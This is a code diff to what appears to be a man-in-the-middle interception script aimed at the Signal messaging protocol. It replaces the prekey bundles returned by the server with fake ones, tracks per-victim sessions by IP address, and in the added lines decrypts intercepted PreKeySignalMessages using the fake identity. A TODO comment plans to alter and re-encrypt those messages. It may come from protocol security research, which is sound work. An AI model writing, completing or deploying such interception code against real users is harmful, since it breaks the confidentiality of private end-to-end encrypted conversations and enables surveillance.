@@ -299,7 +299,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
 
-    logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
+    #logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
     identity, uuid = strip_uuid_and_id(identifier)
 
     bob_identity_key_public = b64decode(resp["identityKey"])
@@ -336,14 +336,13 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                                                    kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                                    bob_kyber_pre_key_signature)
-        
-        
         try:
             assert bob_bundle.device_id().get_id() > 0
         except AssertionError:
-            logging.error(f"Device ID is not greater than 0: {bundle}")
+            logging.error(f"Device ID is not greater than 0: {bob_bundle.device_id().get_id()}")
 
-        logging.warning(registration_info[ip_address])
+        logging.warning(registration_info)
+        #logging.warning(flow, ip_address)
         lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
             ip_address].pniData
 
@@ -453,7 +452,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     resp.update(fakeBundle_wire)
     conversation_session[(ip_address, identifier)] = (fakeVictim, fakeUser)
-    logging.warning(f"session {conversation_session}")
+    #logging.warning(f"session {conversation_session}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
@@ -560,6 +559,12 @@ def _v1_ws_message(flow, identifier):
 
     session = conversation_session.get((ip_address, destination))
 
+    if session:
+        fakeVictim, fakeUser = session
+    else:
+        #logging.error(f"Session not found for {ip_address} and {destination}")
+        return
+
     logging.warning(f"SESSION: {session}")
 
     for msg in req["messages"]:
@@ -573,15 +578,15 @@ def _v1_ws_message(flow, identifier):
             logging.warning(f"Only PREKEY_BUNDLE is supported at the moment, got {envelope_type}. C.f. my Twint ;)")
             continue
 
-        content = b64decode(msg["content"])[1:]
+        content = b64decode(msg["content"])
 
         msg_type = OutgoingMessageType(int(msg["type"]))
         if msg_type == OutgoingMessageType.PREKEY_BUNDLE:
-            ctxt = PreKeySignalMessage()
-            ctxt.ParseFromString(content)
 
-        logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key).decode()}")
-        logging.info(f"ctxt from IK: {ctxt}")
+            fakeUser.decrypt(address.ProtocolAddress(destination, msg["destinationDeviceId"]), protocol.PreKeySignalMessage.try_from(content))
+
+        # logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key).decode()}")
+        # logging.info(f"ctxt from IK: {ctxt}")
         # TODO: unproduf / decrypt / alter / encrypt / prodobuf 
 
 
